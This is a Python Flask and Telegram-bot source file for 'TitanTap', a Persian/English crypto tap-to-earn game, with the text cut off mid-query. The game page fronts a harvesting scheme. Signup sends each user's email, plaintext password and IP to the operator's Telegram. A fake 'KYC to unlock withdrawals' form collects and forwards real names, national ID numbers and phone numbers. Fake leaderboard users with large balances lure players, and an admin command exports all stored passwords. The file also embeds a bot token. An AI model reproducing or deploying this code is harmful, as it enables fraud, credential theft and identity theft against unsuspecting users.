import sqlite3
import requests
import threading
import telebot
from telebot import types
from flask import Flask, request, jsonify
import os
import time
import csv
import random

# ====== تنظیمات ======
BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
ADMIN_ID  = "2028533085"
# ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# ====== دیتابیس ======
def init_db():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        ip TEXT,
        first_name TEXT,
        last_name TEXT,
        national_id TEXT,
        phone TEXT,
        kyc_status TEXT DEFAULT 'none',
        balance REAL DEFAULT 0.0,
        profit_per_hour REAL DEFAULT 0.0,
        tap_power REAL DEFAULT 0.001,
        status TEXT DEFAULT 'approved',
        referrer TEXT DEFAULT NULL,
        ref_count INTEGER DEFAULT 0,
        card1 INT DEFAULT 0,
        card2 INT DEFAULT 0,
        card3 INT DEFAULT 0,
        card4 INT DEFAULT 0,
        last_sync REAL DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

# ====== ساخت ربات‌های فیک ======
def add_fake_bots():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users WHERE status='bot'")
    if c.fetchone()[0] == 0:
        fake_names = ["CryptoKing", "Satoshi99", "HamsterPro", "TitanWhale", "Ali_Tapper", "MoonBoy"]
        for name in fake_names:
            email = f"{name.lower()}@fake.com"
            c.execute("INSERT OR IGNORE INTO users (email, password, status, balance, last_sync) VALUES (?, '123', 'bot', 5000.0, ?)", (email, time.time()))
        conn.commit()
    conn.close()

add_fake_bots()

# ====== ربات تلگرام (پنل ادمین) ======
@bot.message_handler(commands=['start', 'admin'])
def bot_start(message):
    if str(message.chat.id) == ADMIN_ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton('👥 لیست کاربران'), types.KeyboardButton('📊 آمار بازی'))
        markup.add(types.KeyboardButton('📥 دانلود دیتابیس'), types.KeyboardButton('💸 ویرایش موجودی'))
        bot.reply_to(message, "👑 به پنل مدیریت TitanTap خوش آمدید:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📊 آمار بازی')
def bot_stats(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*), SUM(balance) FROM users WHERE status='approved'")
    count, total_bal = c.fetchone()
    conn.close()
    bot.reply_to(message, f"📈 **آمار کلی:**\n\n👥 کاربران: {count}\n💰 مجموع تپ‌کوین‌ها: {total_bal:.2f} TTN")

@bot.message_handler(func=lambda message: message.text == '📥 دانلود دیتابیس')
def bot_export(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT id, email, password, ip, first_name, last_name, national_id, phone, balance FROM users WHERE status='approved'")
    users = c.fetchall()
    conn.close()
    
    if not users:
        bot.reply_to(message, "دیتابیس خالی است.")
        return
        
    filename = "users_data.csv"
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['ID', 'Email', 'Password', 'IP', 'First Name', 'Last Name', 'National ID', 'Phone', 'Balance'])
        writer.writerows(users)
        
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f)
    os.remove(filename)

@bot.message_handler(func=lambda message: message.text == '👥 لیست کاربران')
def bot_list_users(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT id, email, balance FROM users WHERE status='approved' ORDER BY id DESC LIMIT 20")
    users = c.fetchall()
    conn.close()
    
    if not users:
        bot.reply_to(message, "هیچ کاربری وجود ندارد.")
        return
        
    text = "👥 **۲۰ کاربر آخر:**\n\n"
    for u in users:
        text += f"ID: {u[0]} | {u[1]} | {u[2]:.1f} TTN\n"
    text += "\nبرای ویرایش موجودی، از دستور زیر استفاده کنید:\n`/setbalance ID AMOUNT`"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['setbalance'])
def bot_set_balance(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        _, uid, amount = message.text.split()
        conn = sqlite3.connect('game.db')
        c = conn.cursor()
        c.execute("UPDATE users SET balance=? WHERE id=?", (float(amount), int(uid)))
        conn.commit()
        conn.close()
        bot.reply_to(message, f"✅ موجودی کاربر {uid} به {amount} TTN تغییر کرد.")
    except:
        bot.reply_to(message, "❌ فرمت اشتباه است. مثال:\n`/setbalance 5 10000`")

# ====== وب سرور (بازی) ======
html_game = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TitanTap</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --primary: #ffaa00; --bg: #0b0f19; --card: #151b2b; --gold: #ffd700; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', 'Inter', sans-serif; }
  body { background: var(--bg); color: white; display: flex; justify-content: center; min-height: 100vh; padding-bottom: 70px; overflow-x: hidden; transition: 0.3s; }
  body.en { direction: ltr; font-family: 'Inter', sans-serif; }
  
  .app-container { width: 100%; max-width: 420px; padding: 20px; text-align: center; position: relative; }
  .lang-toggle { position: absolute; top: 20px; left: 20px; background: var(--card); border: 1px solid #2a3441; color: white; padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 12px; z-index: 100; }
  
  .screen { display: none; animation: fadeIn 0.3s ease-out; }
  .active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  
  h1 { font-size: 24px; font-weight: 800; color: var(--primary); margin-bottom: 20px; margin-top: 30px; }
  input { width:100%; padding:15px; margin-bottom:15px; border-radius:12px; border:1px solid #2a3441; background:var(--card); color:white; font-family: inherit; }
  
  .balance-card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a3441; position: relative; z-index: 2; }
  .balance-value { font-size: 38px; font-weight: 800; color: var(--primary); }
  .profit-hour { font-size: 14px; color: var(--gold); margin-top: 5px; }
  
  .tap-area { height: 220px; display: flex; justify-content: center; align-items: center; position: relative; }
  .tap-btn { width: 180px; height: 180px; border-radius: 50%; background: radial-gradient(circle, #ffaa00, #b37700); display: flex; justify-content: center; align-items: center; box-shadow: 0 0 40px rgba(255, 170, 0, 0.4); border: 4px solid #fff; transition: 0.1s; cursor: pointer; font-size: 80px; z-index: 2; user-select: none; }
  .tap-btn:active { transform: scale(0.9); box-shadow: 0 0 60px rgba(255, 170, 0, 0.8); }
  
  .particle { position: absolute; width: 10px; height: 10px; background: gold; border-radius: 50%; pointer-events: none; animation: fly 0.5s ease-out forwards; }
  @keyframes fly { 0% { transform: translate(0, 0) scale(1); opacity: 1; } 100% { transform: translate(var(--x), var(--y)) scale(0); opacity: 0; } }

  .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .upgrade-card { background: var(--card); padding: 15px; border-radius: 15px; border: 1px solid #2a3441; text-align: left; cursor: pointer; }
  body[dir="rtl"] .upgrade-card { text-align: right; }
  .upgrade-card h3 { font-size: 14px; margin-bottom: 5px; }
  .upgrade-card p { font-size: 12px; color: #8892b0; }
  .upgrade-card .price { color: var(--primary); font-weight: bold; margin-top: 10px; font-size: 13px; }
  
  .leaderboard-item { display: flex; justify-content: space-between; background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
  
  .daily-card, .cipher-card, .kyc-card, .spin-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #2a3441; margin-bottom: 20px; }
  .btn-action { padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; margin-top: 15px; width: 100%; cursor: pointer; font-size: 16px; font-family: inherit; }
  
  .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #2a3441; max-width: 420px; margin: 0 auto; right: 0; z-index: 10; }
  .nav-item { font-size: 10px; color: #8892b0; cursor: pointer; display: flex; flex-direction: column; align-items: center; }
  .nav-item.active { color: var(--primary); font-weight: bold; }
  .nav-icon { font-size: 18px; margin-bottom: 3px; }
</style>
</head>
<body dir="rtl">
<div class="app-container">
  <div class="lang-toggle" onclick="toggleLang()">EN / FA</div>
  
  <div id="login-screen" class="screen active">
    <h1>🛡️ TitanTap</h1>
    <input type="email" id="email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
    <input type="password" id="password" data-fa="رمز عبور" data-en="Password" placeholder="رمز عبور">
    <button class="btn-action" onclick="register()" data-fa="ساخت حساب" data-en="Create Account">ساخت حساب</button>
  </div>

  <div id="main-app" class="screen">
    
    <div id="tab-mine" class="tab-content">
      <div class="balance-card">
        <div style="font-size:14px; color:#8892b0;" data-fa="موجودی شما" data-en="Your Balance">موجودی شما</div>
        <div class="balance-value"><span id="balance">0.000</span> <span style="font-size:20px; color:#fff;">TTN</span></div>
        <div class="profit-hour">+<span id="profit">0.00</span> TTN / <span data-fa="ساعت" data-en="hour">ساعت</span></div>
      </div>
      <div class="tap-area" id="tap-area">
        <div class="tap-btn" id="tap-btn" onclick="tap(event)">🛡️</div>
      </div>
    </div>

    <div id="tab-upgrades" class="tab-content" style="display:none;">
      <h1 data-fa="کارت‌های استخراج" data-en="Mining Cards">کارت‌های استخراج</h1>
      <div class="cards-grid">
        <div class="upgrade-card" onclick="upgrade('card1')"><h3>🏠 <span data-fa="ماینر خانگی" data-en="Home Miner">ماینر خانگی</span></h3><p>Lvl <span id="lvl_card1">0</span> | +10/hr</p><div class="price">Cost: <span id="cost_card1">100</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card2')"><h3>☁️ <span data-fa="سرور ابری" data-en="Cloud Server">سرور ابری</span></h3><p>Lvl <span id="lvl_card2">0</span> | +60/hr</p><div class="price">Cost: <span id="cost_card2">500</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card3')"><h3>🤖 <span data-fa="دیتاسنتر هوش مصنوعی" data-en="AI Datacenter">دیتاسنتر هوش مصنوعی</span></h3><p>Lvl <span id="lvl_card3">0</span> | +300/hr</p><div class="price">Cost: <span id="cost_card3">2000</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card4')"><h3>⚛️ <span data-fa="ریگ کوانتومی" data-en="Quantum Rig">ریگ کوانتومی</span></h3><p>Lvl <span id="lvl_card4">0</span> | +1500/hr</p><div class="price">Cost: <span id="cost_card4">10000</span></div></div>
      </div>
    </div>

    <div id="tab-games" class="tab-content" style="display:none;">
      <h1 data-fa="بازی‌ها و جوایز" data-en="Games & Rewards">بازی‌ها و جوایز</h1>
      <div class="spin-card">
        <h3>🎡 <span data-fa="گردونه شانس" data-en="Spin The Wheel">گردونه شانس</span></h3>
        <p style="margin-top:10px; font-size:13px;"><span data-fa="هزینه: ۱۰۰ TTN" data-en="Cost: 100 TTN">هزینه: ۱۰۰ TTN</span></p>
        <button class="btn-action" onclick="spinWheel()" style="margin-top:10px;" data-fa="بچرخون!" data-en="Spin Now!">بچرخون!</button>
      </div>
      <div class="cipher-card">
        <h3>🎁 <span data-fa="کد روزانه" data-en="Daily Cipher">کد روزانه</span></h3>
        <p style="font-size:13px; margin-top:5px;" data-fa="کد TITAN را وارد کنید و ۵۰۰ TTN بگیرید!" data-en="Enter TITAN to win 500 TTN!">کد TITAN را وارد کنید و ۵۰۰ TTN بگیرید!</p>
        <input type="text" id="cipher_input" placeholder="Enter Code" style="margin-top:10px; text-align:center; text-transform:uppercase;">
        <button class="btn-action" onclick="submitCipher()" data-fa="ارسال کد" data-en="Submit Code">ارسال کد</button>
      </div>
    </div>

    <div id="tab-friends" class="tab-content" style="display:none;">
      <h1 data-fa="دعوت دوستان" data-en="Invite Friends">دعوت دوستان</h1>
      <div class="daily-card">
        <p data-fa="با هر دعوت ۲۰۰ TTN بگیرید!" data-en="Earn 200 TTN per verified friend!">با هر دعوت ۲۰۰ TTN بگیرید!</p>
        <p style="margin-top:10px;"><span data-fa="دوستان دعوت شده:" data-en="Friends Invited:">دوستان دعوت شده:</span> <b id="ref_count" style="color:var(--primary);">0</b></p>
        <input type="text" id="ref_link" readonly style="margin-top:15px; text-align:center; color:var(--primary);">
        <button class="btn-action" onclick="copyLink()" data-fa="کپی لینک دعوت" data-en="Copy Invite Link">کپی لینک دعوت</button>
      </div>
    </div>

    <div id="tab-top" class="tab-content" style="display:none;">
      <h1 data-fa="لیدربورد" data-en="Leaderboard">لیدربورد</h1>
      <div id="leaderboard-list"></div>
    </div>

    <div id="tab-profile" class="tab-content" style="display:none;">
      <h1 data-fa="پروفایل و احراز هویت" data-en="Profile & KYC">پروفایل و احراز هویت</h1>
      <div class="kyc-card">
        <p style="font-size:13px; color:#8892b0; margin-bottom:10px;" data-fa="برای فعالسازی برداشت، احراز هویت کنید." data-en="Complete KYC to unlock withdrawals.">برای فعالسازی برداشت، احراز هویت کنید.</p>
        <input type="text" id="fname" data-fa="نام واقعی" data-en="Real First Name" placeholder="نام واقعی">
        <input type="text" id="lname" data-fa="نام خانوادگی" data-en="Real Last Name" placeholder="نام خانوادگی">
        <input type="text" id="nid" data-fa="کد ملی" data-en="National ID" placeholder="کد ملی">
        <input type="text" id="phone" data-fa="شماره تماس" data-en="Phone Number" placeholder="شماره تماس">
        <button class="btn-action" onclick="submitKYC()" style="background:#00ffcc;" data-fa="ذخیره اطلاعات" data-en="Save KYC Info">ذخیره اطلاعات</button>
      </div>
    </div>

    <div class="bottom-nav">
      <div class="nav-item active" onclick="switchTab('mine', this)"><div class="nav-icon">🪙</div><span data-fa="استخراج" data-en="Mine">استخراج</span></div>
      <div class="nav-item" onclick="switchTab('upgrades', this)"><div class="nav-icon">🃏</div><span data-fa="کارت‌ها" data-en="Cards">کارت‌ها</span></div>
      <div class="nav-item" onclick="switchTab('games', this)"><div class="nav-icon">🎮</div><span data-fa="بازی‌ها" data-en="Games">بازی‌ها</span></div>
      <div class="nav-item" onclick="switchTab('friends', this)"><div class="nav-icon">👥</div><span data-fa="دوستان" data-en="Friends">دوستان</span></div>
      <div class="nav-item" onclick="switchTab('top', this)"><div class="nav-icon">🏆</div><span data-fa="برترین‌ها" data-en="Top">برترین‌ها</span></div>
      <div class="nav-item" onclick="switchTab('profile', this)"><div class="nav-icon">👤</div><span data-fa="پروفایل" data-en="Profile">پروفایل</span></div>
    </div>

  </div>
</div>

<script>
  let userEmail = "";
  let gameInterval;
  let currentProfit = 0;
  let currentTapPower = 0.001;
  let costs = { card1: 100, card2: 500, card3: 2000, card4: 10000 };
  let currentLang = 'fa';

  function toggleLang() {
    currentLang = currentLang === 'fa' ? 'en' : 'fa';
    document.body.dir = currentLang === 'fa' ? 'rtl' : 'ltr';
    document.body.className = currentLang === 'en' ? 'en' : '';
    
    document.querySelectorAll('[data-fa]').forEach(el => {
      if(el.tagName === 'INPUT') {
        el.placeholder = currentLang === 'fa' ? el.getAttribute('data-fa') : el.getAttribute('data-en');
      } else {
        el.innerText = currentLang === 'fa' ? el.getAttribute('data-fa') : el.getAttribute('data-en');
      }
    });
  }

  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  function playCoinSound() {
      if(audioCtx.state === 'suspended') audioCtx.resume();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(1800, audioCtx.currentTime + 0.1);
      gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.1);
  }

  async function register() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    if(!email || !password) return alert("Fill all fields");
    
    const res = await fetch('/api/register', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    const data = await res.json();
    if(data.success) {
      userEmail = email;
      document.getElementById('login-screen').classList.remove('active');
      document.getElementById('main-app').classList.add('active');
      checkStatus();
    } else { alert("Registration failed."); }
  }

  async function checkStatus() {
    const res = await fetch('/api/status', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail})
    });
    const data = await res.json();
    
    if(data.status === 'approved') {
      updateUI(data);
      document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
      
      if(gameInterval) clearInterval(gameInterval);
      gameInterval = setInterval(() => {
        let current = parseFloat(document.getElementById('balance').innerText);
        let gain = currentProfit / 3600;
        document.getElementById('balance').innerText = (current + gain).toFixed(3);
      }, 1000);
    }
  }

  function updateUI(data) {
    document.getElementById('balance').innerText = data.balance.toFixed(3);
    document.getElementById('profit').innerText = data.profit_per_hour.toFixed(2);
    currentProfit = data.profit_per_hour;
    currentTapPower = data.tap_power;
    document.getElementById('ref_count').innerText = data.ref_count;
    
    for(let i=1; i<=4; i++) {
        let el = document.getElementById('lvl_card'+i);
        if(el) el.innerText = data['card'+i];
        let costEl = document.getElementById('cost_card'+i);
        if(costEl) {
            costs['card'+i] = costs['card'+i] * Math.pow(1.5, data['card'+i]);
            costEl.innerText = Math.floor(costs['card'+i]);
        }
    }
  }

  async function tap(e) {
    if (navigator.vibrate) navigator.vibrate(20);
    playCoinSound();
    createParticles(e);

    const res = await fetch('/api/tap', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, power: currentTapPower})
    });
    const data = await res.json();
    if(data.success) document.getElementById('balance').innerText = data.balance.toFixed(3);
  }

  function createParticles(e) {
    const rect = document.getElementById('tap-area').getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    
    for(let i=0; i<5; i++) {
      let p = document.createElement('div');
      p.className = 'particle';
      p.style.left = x + 'px';
      p.style.top = y + 'px';
      p.style.setProperty('--x', (Math.random() - 0.5) * 200 + 'px');
      p.style.setProperty('--y', (Math.random() - 0.5) * 200 - 50 + 'px');
      document.getElementById('tap-area').appendChild(p);
      setTimeout(() => p.remove(), 500);
    }
  }

  async function upgrade(type) {
    const res = await fetch('/api/upgrade', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, type: type, cost: costs[type]})
    });
    const data = await res.json();
    if(data.success) { updateUI(data); alert("Upgrade successful!"); }
    else { alert(data.message); }
  }
  
  async function submitCipher() {
    const code = document.getElementById('cipher_input').value;
    const res = await fetch('/api/cipher', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, code: code})
    });
    const data = await res.json();
    if(data.success) {
      alert("Correct! 500 TTN added.");
      document.getElementById('balance').innerText = data.balance.toFixed(3);
    } else { alert(data.message); }
  }

  async function spinWheel() {
    const res = await fetch('/api/spin', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail})
    });
    const data = await res.json();
    if(data.success) {
      alert("Result: " + data.result);
      document.getElementById('balance').innerText = data.balance.toFixed(3);
    } else { alert(data.message); }
  }

  async function submitKYC() {
    const fname = document.getElementById('fname').value;
    const lname = document.getElementById('lname').value;
    const nid = document.getElementById('nid').value;
    const phone = document.getElementById('phone').value;
    if(!fname || !lname || !nid || !phone) return alert("Fill all KYC fields");
    
    const res = await fetch('/api/kyc', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, fname, lname, nid, phone})
    });
    const data = await res.json();
    if(data.success) alert("KYC Information submitted successfully!");
  }

  async function loadLeaderboard() {
    const res = await fetch('/api/leaderboard');
    const data = await res.json();
    let html = "";
    data.forEach((u, i) => {
      html += `<div class="leaderboard-item"><span>#${i+1} ${u.name}</span> <span style="color:var(--primary);">${u.balance.toFixed(1)} TTN</span></div>`;
    });
    document.getElementById('leaderboard-list').innerHTML = html;
  }

  function switchTab(tab, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
    document.getElementById('tab-' + tab).style.display = 'block';
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
    if(tab === 'top') loadLeaderboard();
  }

  function copyLink() {
    const link = document.getElementById('ref_link');
    link.select();
    document.execCommand('copy');
    alert("Link copied!");
  }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return html_game

# ================= API ROUTES =================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    ip = request.remote_addr
    referrer = request.args.get('ref')
    now = time.time()
    
    try:
        conn = sqlite3.connect('game.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", 
                  (email, password, ip, referrer, now))
        conn.commit()
        conn.close()
        
        text = f"🔴 **New Signup (TitanTap)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
        bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/kyc', methods=['POST'])
def kyc():
    data = request.json
    email = data.get('email')
    fname = data.get('fname')
    lname = data.get('lname')
    nid = data.get('nid')
    phone = data.get('phone')
    ip = request.remote_addr
    
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("UPDATE users SET first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending' WHERE email=?", 
              (fname, lname, nid, phone, email))
    conn.commit()
    conn.close()
    
    text = f"💳 **KYC Submitted (TitanTap)**\n\n📧 Email: {email}\n👤 Name: {fname} {lname}\n🆔 National ID: {nid}\n📱 Phone: {phone}\n🌐 IP: {ip}"
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
    return jsonify({"success": True})

@app.route('/api/spin', methods=['POST'])
def spin():
    email = request.json.get('email')
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE email=?", (email,))
    bal = c.fetchone()[0]
    
    if bal < 100:
        conn.close()
        return jsonify({"success": False, "message": "Not enough TTN to spin (Needs 100)"})
        
    outcomes = [
        {"mult": 0, "text": "You lost! Try again."},
        {"mult": 0, "text": "You lost! Try again."},
        {"mult": 0.5, "text": "You won 50 TTN!"},
        {"mult": 1.5, "text": "You won 150 TTN!"},
        {"mult": 3, "text": "JACKPOT! You won 300 TTN!"}
    ]
    result = random.choice(outcomes)
    new_bal = bal - 100 + (100 * result["mult"])
    
    c.execute("UPDATE users SET balance = ? WHERE email=?", (new_bal, email))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "result": result["text"], "balance": new_bal})

@app.route('/api/status', methods=['POST'])
def status():
    email = request.json.get('email')
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT status, balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count, last_sync FROM users WHERE email
